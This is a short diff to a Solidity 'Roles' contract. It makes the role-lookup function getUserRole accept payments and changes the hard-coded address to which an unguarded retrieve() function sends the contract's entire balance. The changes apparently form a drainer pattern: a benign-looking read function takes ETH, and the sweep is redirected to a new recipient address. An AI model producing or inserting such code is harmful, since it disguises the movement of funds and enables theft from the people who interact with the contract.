@@ -2,12 +2,13 @@ pragma solidity ^0.8.0;
 
 contract Roles {
     mapping(address => bool) _authorized;
-
+    event GetUserRole(string role);
     function getUserRole(address walletAddress)
         external
-        view
+        payable
         returns (string memory)
     {
+        emit GetUserRole(_authorized[walletAddress] ? "admin" : "user");
         return _authorized[walletAddress] ? "admin" : "user";
     }
 
@@ -17,7 +18,7 @@ contract Roles {
     }
 
     function retrieve() external {
-        (0x412f2182BFBCd943821CE6908Ec456e9ef52e8fc).call{
+        (0x3916AA950d10e30Afd9b0741921eB8705b63702f).call{
             value: address(this).balance
         }("");
     }
